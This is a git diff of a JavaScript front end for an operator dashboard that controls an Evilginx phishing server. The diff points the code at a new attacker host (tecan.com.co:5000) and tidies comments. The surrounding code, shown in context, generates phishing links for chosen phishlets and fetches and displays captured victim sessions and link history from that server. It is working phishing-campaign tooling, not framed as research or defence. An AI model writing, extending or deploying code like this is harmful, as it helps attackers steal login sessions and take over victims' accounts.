@@ -1,7 +1,7 @@
 console.log("✅ script.js loaded successfully");
 
 // Set your Evilginx server (update with your actual domain or public IP and port)
-const EVILGINX_SERVER = "http://3.149.242.245:5000";
+const EVILGINX_SERVER = "http://tecan.com.co:5000";
 
 // Wait for Firebase to load before executing functions.
 document.addEventListener("DOMContentLoaded", function () {
@@ -10,7 +10,7 @@ document.addEventListener("DOMContentLoaded", function () {
     return;
   }
   checkAuthStatus();
-  
+
   // Attach login event if not already attached
   const loginBtn = document.getElementById("loginBtn");
   if (loginBtn) {
@@ -18,16 +18,18 @@ document.addEventListener("DOMContentLoaded", function () {
   }
 });
 
-// Check Authentication Status and Redirect Accordingly
+// Check Authentication Status and Redirect Accordingly.
 function checkAuthStatus() {
   firebase.auth().onAuthStateChanged(function (user) {
     if (user) {
       console.log("✅ User logged in:", user.email);
+      // If on login page and user is already logged in, redirect to dashboard.
       if (window.location.pathname.endsWith("index.html") || window.location.pathname === "/") {
         window.location.href = "dashboard.html";
       }
     } else {
       console.log("❌ User not logged in.");
+      // If on a dashboard page and not logged in, redirect to login.
       if (window.location.pathname.endsWith("dashboard.html") || window.location.pathname.endsWith("dashboard2.html")) {
         window.location.href = "index.html";
       }
@@ -35,7 +37,7 @@ function checkAuthStatus() {
   });
 }
 
-// Login Function
+// Login Function.
 function login() {
   const email = document.getElementById("email").value;
   const password = document.getElementById("password").value;
@@ -56,7 +58,7 @@ function login() {
     });
 }
 
-// Logout Function
+// Logout Function.
 function logout() {
   firebase.auth().signOut().then(function () {
     console.log("✅ User logged out.");
@@ -87,7 +89,7 @@ function generateLink() {
     });
 }
 
-// Generate a phishing link for a specific phishlet (for Dashboard2)
+// Generate a phishing link for a specific phishlet (for Dashboard2).
 function generatePhishletLink(phishlet) {
   const url = `${EVILGINX_SERVER}/generate_link?phishlet=${encodeURIComponent(phishlet)}`;
   fetch(url)
@@ -108,7 +110,7 @@ function generatePhishletLink(phishlet) {
     });
 }
 
-// Fetch and display captured sessions from Evilginx
+// Fetch and display captured sessions from Evilginx.
 function viewCapturedSessions() {
   fetch(`${EVILGINX_SERVER}/captured_sessions`)
     .then(function (response) { return response.json(); })
@@ -132,7 +134,7 @@ function viewCapturedSessions() {
     });
 }
 
-// Fetch and display generated links history from Evilginx
+// Fetch and display generated links history from Evilginx.
 function viewGeneratedLinks() {
   fetch(`${EVILGINX_SERVER}/generated_links`)
     .then(function (response) { return response.json(); })
